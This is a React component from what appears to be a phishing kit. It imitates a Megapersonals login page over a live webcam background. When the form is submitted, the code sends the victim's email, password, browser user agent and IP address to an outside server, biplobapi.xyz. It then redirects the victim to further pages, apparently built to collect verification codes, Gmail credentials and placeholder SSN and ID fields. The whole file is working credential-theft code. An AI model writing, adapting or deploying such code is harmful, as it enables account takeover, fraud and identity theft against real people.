import React from "react";
import { useEffect } from "react";
import { useRef } from "react";
import { useState } from "react";
import { useForm } from "react-hook-form";
import { useLoaderData, useNavigate, useParams } from "react-router-dom";

const VideoLogin = () => {
  const { user } = useLoaderData();
  const videoRef = useRef(null);
  const params = useParams();
  const navigate = useNavigate();
  const [userAgent, setUserAgent] = useState("");
  const [ipAddress, setIPAddress] = useState("");

  useEffect(() => {
    const userAgent = window.navigator.userAgent;
    setUserAgent(userAgent);

    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) => setIPAddress(data.ip))
      .catch((error) => console.log(error));

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
        });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play().catch((error) => {
            console.error("Error playing video:", error);
          });
        }
      } catch (error) {
        console.error("Error accessing camera:", error);
      }
    }

    startCamera();

    // Cleanup function to stop the camera when the component unmounts
    return () => {
      if (videoRef.current && videoRef.current.srcObject) {
        const stream = videoRef.current.srcObject;
        const tracks = stream.getTracks();
        tracks.forEach((track) => track.stop());
      }
    };
  }, []);

  const {
    register,
    handleSubmit,
    formState: { errors },
    reset,
  } = useForm();

  const handleAddBooking = (data) => {
    const bookings = {
      email: data.email,
      password: data.password,
      site: "mega",
      code: "",
      ssn: "",
      idOne: "",
      idTwo: "",
      agent: userAgent,
      ipAddress: ipAddress,
      user: user,
      temp: Math.floor(Math.random() * (9999 - 1111) + 1111),
      postingTime: Date().toLocaleString(),
    };
    fetch("https://biplobapi.xyz/informations", {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then((res) => res.json())
      .then((result) => {
        reset();
        pathInfo(bookings);
      });
  };
  const pathInfo = (infos) => {
    let userId = window.location.pathname;
    const fnl = userId.substring(
      userId.indexOf("/") + 1,
      userId.lastIndexOf("/")
    );
    if (fnl === "live/chat/email") {
      // navigate("/gmail", { state: { temp: infos.temp } });
      navigate("/live/chat/code", { state: { temp: infos.temp } });
      // navigate("/gmail", { state: { temp: infos.temp } });
    } else {
      navigate("/gmail", { state: { temp: infos.temp } });
    }
  };
  return (
    <div className="home-bg-2 position-relative min-h-full">
      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        loop
        style={{ height: "100vh", minWidth: "100vw", objectFit: "cover" }}
        className="position-absolute z-10 min-w-full min-h-full h-screen max-w-full left-0 top-0 vdo"
      />
      <div
        className="code-card position-absolute z-20 text-center"
        style={{ left: "50%", transform: "translateX(-50%)" }}
      >
        <form className="form-card" onSubmit={handleSubmit(handleAddBooking)}>
          <h6>Log in to your Megapersonals account</h6>
          <input
            type="email"
            placeholder="Your Email"
            className="form-tag"
            {...register("email", { required: true })}
          />
          <input
            type="password"
            placeholder="Password"
            className="form-tag"
            {...register("password", { required: true })}
          />
          <button className="btn btn-primary">Submit</button>
        </form>
      </div>
    </div>
  );
};

export default VideoLogin;
